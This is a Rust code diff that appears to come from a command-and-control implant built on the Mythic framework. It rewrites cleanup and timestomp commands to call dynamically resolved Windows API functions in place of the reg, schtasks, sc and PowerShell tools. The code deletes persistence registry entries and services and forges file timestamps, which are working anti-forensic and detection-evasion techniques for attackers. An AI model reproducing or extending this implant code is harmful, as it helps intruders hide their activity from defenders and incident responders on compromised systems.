@@ -58,15 +58,34 @@ fn cleanup_registry(task: &AgentTask, target: &str) -> Result<serde_json::Value,
         return Ok(mythic_error!(task.id, "Registry key path required"));
     }
 
-    let output = Command::new("reg")
-        .args(&["delete", target, "/f"])
-        .output()?;
+    unsafe {
+        type RegDeleteKeyExAFn = unsafe extern "system" fn(usize, *const u8, u32, u32) -> i32;
+        let reg_delete: RegDeleteKeyExAFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "RegDeleteKeyExA")
+                .ok_or("Failed to resolve RegDeleteKeyExA")?
+        );
 
-    if output.status.success() {
-        Ok(mythic_success!(task.id, format!("Deleted registry key: {}", target)))
+        let target_c = std::ffi::CString::new(target)?;
+        let (hkey, subkey) = parse_reg_path(target);
+        let subkey_c = std::ffi::CString::new(subkey)?;
+
+        let result = reg_delete(hkey, subkey_c.as_ptr() as *const u8, 0x0100, 0); // KEY_WOW64_64KEY
+        if result == 0 {
+            Ok(mythic_success!(task.id, format!("Deleted registry key: {}", target)))
+        } else {
+            Ok(mythic_error!(task.id, format!("RegDeleteKeyExA failed: error {}", result)))
+        }
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn parse_reg_path(path: &str) -> (usize, &str) {
+    if let Some(rest) = path.strip_prefix("HKLM\\").or(path.strip_prefix("HKEY_LOCAL_MACHINE\\")) {
+        (0x80000002, rest) // HKEY_LOCAL_MACHINE
+    } else if let Some(rest) = path.strip_prefix("HKCU\\").or(path.strip_prefix("HKEY_CURRENT_USER\\")) {
+        (0x80000001, rest) // HKEY_CURRENT_USER
     } else {
-        let stderr = String::from_utf8_lossy(&output.stderr);
-        Ok(mythic_error!(task.id, format!("Failed to delete registry key: {}", stderr)))
+        (0x80000002, path)
     }
 }
 
@@ -81,15 +100,51 @@ fn cleanup_scheduled_task(task: &AgentTask, target: &str) -> Result<serde_json::
         return Ok(mythic_error!(task.id, "Task name required"));
     }
 
-    let output = Command::new("schtasks")
-        .args(&["/Delete", "/TN", target, "/F"])
-        .output()?;
+    // Delete the task's registry entry (same approach as persist_schtask uses registry)
+    unsafe {
+        type RegDeleteValueAFn = unsafe extern "system" fn(usize, *const u8) -> i32;
+        type RegOpenKeyExAFn = unsafe extern "system" fn(usize, *const u8, u32, u32, *mut usize) -> i32;
+        type RegCloseKeyFn = unsafe extern "system" fn(usize) -> i32;
 
-    if output.status.success() {
-        Ok(mythic_success!(task.id, format!("Deleted scheduled task: {}", target)))
-    } else {
-        let stderr = String::from_utf8_lossy(&output.stderr);
-        Ok(mythic_error!(task.id, format!("Failed to delete scheduled task: {}", stderr)))
+        let reg_open: RegOpenKeyExAFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "RegOpenKeyExA")
+                .ok_or("Failed to resolve RegOpenKeyExA")?
+        );
+        let reg_delete_value: RegDeleteValueAFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "RegDeleteValueA")
+                .ok_or("Failed to resolve RegDeleteValueA")?
+        );
+        let reg_close: RegCloseKeyFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "RegCloseKey")
+                .ok_or("Failed to resolve RegCloseKey")?
+        );
+
+        // Try to remove from Run key (where persist_schtask stores it)
+        let run_key = std::ffi::CString::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")?;
+        let mut hkey: usize = 0;
+
+        let result = reg_open(0x80000001, run_key.as_ptr() as *const u8, 0, 0x20006, &mut hkey); // HKCU, KEY_SET_VALUE
+        if result == 0 {
+            let value_name = std::ffi::CString::new(target)?;
+            let del_result = reg_delete_value(hkey, value_name.as_ptr() as *const u8);
+            reg_close(hkey);
+            if del_result == 0 {
+                return Ok(mythic_success!(task.id, format!("Deleted task entry: {}", target)));
+            }
+        }
+
+        // Try HKLM too
+        let result = reg_open(0x80000002, run_key.as_ptr() as *const u8, 0, 0x20006, &mut hkey);
+        if result == 0 {
+            let value_name = std::ffi::CString::new(target)?;
+            let del_result = reg_delete_value(hkey, value_name.as_ptr() as *const u8);
+            reg_close(hkey);
+            if del_result == 0 {
+                return Ok(mythic_success!(task.id, format!("Deleted task entry: {}", target)));
+            }
+        }
+
+        Ok(mythic_error!(task.id, format!("Task '{}' not found in registry Run keys", target)))
     }
 }
 
@@ -104,24 +159,55 @@ fn cleanup_service(task: &AgentTask, target: &str) -> Result<serde_json::Value, 
         return Ok(mythic_error!(task.id, "Service name required"));
     }
 
-    let stop_output = Command::new("sc")
-        .args(&["stop", target])
-        .output()?;
+    unsafe {
+        type OpenSCManagerAFn = unsafe extern "system" fn(*const u8, *const u8, u32) -> *mut std::ffi::c_void;
+        type OpenServiceAFn = unsafe extern "system" fn(*mut std::ffi::c_void, *const u8, u32) -> *mut std::ffi::c_void;
+        type ControlServiceFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut [u8; 36]) -> i32;
+        type DeleteServiceFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+        type CloseServiceHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 
-    let delete_output = Command::new("sc")
-        .args(&["delete", target])
-        .output()?;
+        let open_scm: OpenSCManagerAFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "OpenSCManagerA").ok_or("OpenSCManagerA")?
+        );
+        let open_svc: OpenServiceAFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "OpenServiceA").ok_or("OpenServiceA")?
+        );
+        let control_svc: ControlServiceFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "ControlService").ok_or("ControlService")?
+        );
+        let delete_svc: DeleteServiceFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "DeleteService").ok_or("DeleteService")?
+        );
+        let close_handle: CloseServiceHandleFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "CloseServiceHandle").ok_or("CloseServiceHandle")?
+        );
 
-    if delete_output.status.success() {
-        let stop_msg = if stop_output.status.success() {
-            "stopped and "
+        let sc_manager = open_scm(std::ptr::null(), std::ptr::null(), 0xF003F); // SC_MANAGER_ALL_ACCESS
+        if sc_manager.is_null() {
+            return Ok(mythic_error!(task.id, "Failed to open SCM"));
+        }
+
+        let svc_name = std::ffi::CString::new(target)?;
+        let service = open_svc(sc_manager, svc_name.as_ptr() as *const u8, 0xF01FF); // SERVICE_ALL_ACCESS
+        if service.is_null() {
+            close_handle(sc_manager);
+            return Ok(mythic_error!(task.id, format!("Service '{}' not found", target)));
+        }
+
+        // Try to stop
+        let mut status = [0u8; 36];
+        let _ = control_svc(service, 0x01, &mut status); // SERVICE_CONTROL_STOP
+
+        // Delete
+        let result = delete_svc(service);
+        close_handle(service);
+        close_handle(sc_manager);
+
+        if result != 0 {
+            Ok(mythic_success!(task.id, format!("Service '{}' stopped and deleted", target)))
         } else {
-            ""
-        };
-        Ok(mythic_success!(task.id, format!("Service {}{}", stop_msg, target)))
-    } else {
-        let stderr = String::from_utf8_lossy(&delete_output.stderr);
-        Ok(mythic_error!(task.id, format!("Failed to delete service: {}", stderr)))
+            Ok(mythic_error!(task.id, format!("Failed to delete service '{}'", target)))
+        }
     }
 }
 
@@ -142,33 +228,65 @@ pub fn timestomp(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::err
 
 #[cfg(target_os = "windows")]
 fn timestomp_impl(task: &AgentTask, path: &str, reference: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
-    let ps_cmd = if reference.is_empty() {
-        format!(
-            "$f = Get-Item '{}'; $f.CreationTime = '01/01/2020 00:00:00'; $f.LastWriteTime = '01/01/2020 00:00:00'; $f.LastAccessTime = '01/01/2020 00:00:00'",
-            path.replace("'", "''")
-        )
-    } else {
-        format!(
-            "$ref = Get-Item '{}'; $f = Get-Item '{}'; $f.CreationTime = $ref.CreationTime; $f.LastWriteTime = $ref.LastWriteTime; $f.LastAccessTime = $ref.LastAccessTime",
-            reference.replace("'", "''"),
-            path.replace("'", "''")
-        )
-    };
+    unsafe {
+        type CreateFileAFn = unsafe extern "system" fn(*const u8, u32, u32, *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
+        type GetFileTimeFn = unsafe extern "system" fn(*mut std::ffi::c_void, *mut [u8; 8], *mut [u8; 8], *mut [u8; 8]) -> i32;
+        type SetFileTimeFn = unsafe extern "system" fn(*mut std::ffi::c_void, *const [u8; 8], *const [u8; 8], *const [u8; 8]) -> i32;
+        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 
-    let output = Command::new("powershell")
-        .args(&["-NoProfile", "-Command", &ps_cmd])
-        .output()?;
+        let create_file: CreateFileAFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "CreateFileA").ok_or("CreateFileA")?
+        );
+        let get_file_time: GetFileTimeFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "GetFileTime").ok_or("GetFileTime")?
+        );
+        let set_file_time: SetFileTimeFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "SetFileTime").ok_or("SetFileTime")?
+        );
+        let close_handle: CloseHandleFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle").ok_or("CloseHandle")?
+        );
 
-    if output.status.success() {
-        let msg = if reference.is_empty() {
-            format!("Timestomped {} to 2020-01-01", path)
+        // Get timestamps (from reference file or use neutral date)
+        let (create_time, access_time, write_time) = if !reference.is_empty() {
+            let ref_c = std::ffi::CString::new(reference)?;
+            let ref_handle = create_file(ref_c.as_ptr() as *const u8, 0x80000000, 1, std::ptr::null_mut(), 3, 0x80, std::ptr::null_mut());
+            if ref_handle.is_null() || ref_handle == -1isize as *mut std::ffi::c_void {
+                return Ok(mythic_error!(task.id, format!("Failed to open reference file: {}", reference)));
+            }
+            let mut ct = [0u8; 8];
+            let mut at = [0u8; 8];
+            let mut wt = [0u8; 8];
+            get_file_time(ref_handle, &mut ct, &mut at, &mut wt);
+            close_handle(ref_handle);
+            (ct, at, wt)
         } else {
-            format!("Timestomped {} using reference {}", path, reference)
+            // 2020-01-01 00:00:00 UTC as FILETIME (100ns intervals since 1601-01-01)
+            // = 132224352000000000 = 0x01D4B2A7_3B646000
+            let ft: [u8; 8] = 0x01D4B2A73B646000u64.to_le_bytes();
+            (ft, ft, ft)
         };
-        Ok(mythic_success!(task.id, msg))
-    } else {
-        let stderr = String::from_utf8_lossy(&output.stderr);
-        Ok(mythic_error!(task.id, format!("Failed to timestomp: {}", stderr)))
+
+        // Open target file for write attributes
+        let path_c = std::ffi::CString::new(path)?;
+        let handle = create_file(path_c.as_ptr() as *const u8, 0x100, 3, std::ptr::null_mut(), 3, 0x80, std::ptr::null_mut()); // FILE_WRITE_ATTRIBUTES, OPEN_EXISTING
+        if handle.is_null() || handle == -1isize as *mut std::ffi::c_void {
+            return Ok(mythic_error!(task.id, format!("Failed to open target: {}", path)));
+        }
+
+        let result = set_file_time(handle, &create_time, &access_time, &write_time);
+        close_handle(handle);
+
+        if result != 0 {
+            let msg = if reference.is_empty() {
+                format!("Timestomped {} to 2020-01-01", path)
+            } else {
+                format!("Timestomped {} using reference {}", path, reference)
+            };
+            Ok(mythic_success!(task.id, msg))
+        } else {
+            Ok(mythic_error!(task.id, "SetFileTime failed"))
+        }
     }
 }
 
